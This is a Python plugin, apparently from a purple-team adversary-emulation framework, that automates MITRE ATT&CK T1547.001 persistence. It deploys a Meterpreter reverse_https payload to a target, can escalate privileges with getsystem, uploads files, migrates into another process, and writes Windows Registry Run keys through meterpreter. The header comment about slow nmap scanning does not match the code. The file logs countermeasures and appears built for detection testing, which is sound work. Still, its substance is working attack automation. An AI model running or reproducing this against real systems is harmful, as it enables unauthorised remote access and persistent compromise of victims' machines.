#!/usr/bin/env python3

# A plugin to nmap targets slow motion, to evade sensors

from plugins.base.attack import AttackPlugin, Requirement
from app.interface_sfx import CommandlineColors
import os


class MetasploitAutostart1Plugin(AttackPlugin):

    # Boilerplate
    name = "metasploit_registry_autostart_1"
    description = "Modify the registry to autostart"
    ttp = "T1547_1"
    references = ["https://attack.mitre.org/techniques/T1547/001/"]
    tactics = "Persistence"
    tactics_id = "TA0003"

    required_files = []    # Files shipped with the plugin which are needed by the kali tool. Will be copied to the kali share
    requirements = [Requirement.METASPLOIT]

    def __init__(self):
        super().__init__()
        self.plugin_path = __file__

    def run(self, targets):
        """ Run the command

        @param targets: A list of targets, ip addresses will do
        """

        res = ""
        payload_type = "windows/x64/meterpreter/reverse_https"
        payload_name = "babymetal.exe"
        target = self.targets[0]

        # self.connect_metasploit()
        # ip = socket.gethostbyname(self.attacker_machine_plugin.get_ip())
        self.metasploit.smart_infect(target,
                                     # lhost=ip,
                                     payload=payload_type,
                                     outfile=payload_name,
                                     format="exe",
                                     architecture="x64")

        ###

        rkeys = [r"HKCU\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run",
                 r"HKLM\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run",
                 r"HKLM\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\RunOnceEx\\\\0001\\\\Depend"
                 ]
        regkey = rkeys[self.conf['regkey_variant']]
        # value = "purpledome"

        data_options = [r"c:\\windows\\system32\\calc.exe ",
                        r"c:\\temp\\evil.dll",
                        r"c:\\dummy.dll"]
        data = data_options[self.conf['data_options']]
        # data = r"c:\\windows\\system32\\calc.exe "

        # regkey = self.conf['regkey']
        value = self.conf["value"]
        # data = self.conf["data"]
        command_set = f"reg setval -k {regkey} -v {value} -d {data}"
        command_create = f"reg createkey -k {regkey}"

        if self.conf["getsystem"]:
            self.metasploit.getsystem(target,
                                      variant=0,
                                      situation_description="Elevating privileges to write to the registry",
                                      countermeasure="Observe how pipes are used. Take steps before (gaining access) and after (abusing those new privileges) into account for detection."
                                      )

        self.attack_logger.vprint(
            f"{CommandlineColors.OKCYAN}Execute {command_set} through meterpreter{CommandlineColors.ENDC}", 1)

        if "upload" in self.conf and len(self.conf["upload"]):
            print(f"Before {self.metasploit.meterpreter_execute_on(['pwd'], target)}")
            print(self.metasploit.meterpreter_execute_on(["cd c:\\"], target))
            print(f"After {self.metasploit.meterpreter_execute_on(['pwd'], target)}")
            for src in self.conf["upload"]:
                print(src)
                self.attacker_machine_plugin.put(
                    os.path.join(os.path.dirname(self.plugin_path), "resources", src), src)
                self.metasploit.upload(target, src, src)  # Make sure the process to hide behind is running

        if "start_commands" in self.conf and len(self.conf["start_commands"]):
            for cmd in self.conf["start_commands"]:
                print(cmd)
                self.metasploit.meterpreter_execute_on([cmd], target)  # Make sure the process to hide behind is running

        if self.conf["migrate"]:
            tgt = self.conf["migrate_target"]
            print(f"Migrate to {tgt}")
            self.metasploit.migrate(target, name=tgt)

        logid = self.attack_logger.start_metasploit_attack(source=self.attacker_machine_plugin.get_ip(),
                                                           target=target.get_ip(),
                                                           metasploit_command=command_set,
                                                           ttp=self.ttp,
                                                           name="registry add run key",
                                                           description=self.description,
                                                           tactics=self.tactics,
                                                           tactics_id=self.tactics_id,
                                                           situation_description="",
                                                           countermeasure=""
                                                           )
        res = self.metasploit.meterpreter_execute_on([command_create], target)
        print(res)
        res = self.metasploit.meterpreter_execute_on([command_set], target)
        print(res)
        self.attack_logger.stop_metasploit_attack(source=self.attacker_machine_plugin.get_ip(),
                                                  target=target.get_ip(),
                                                  metasploit_command=command_set,
                                                  ttp=self.ttp,
                                                  logid=logid,
                                                  result=res)
        ###
        # breakpoint()
        return res
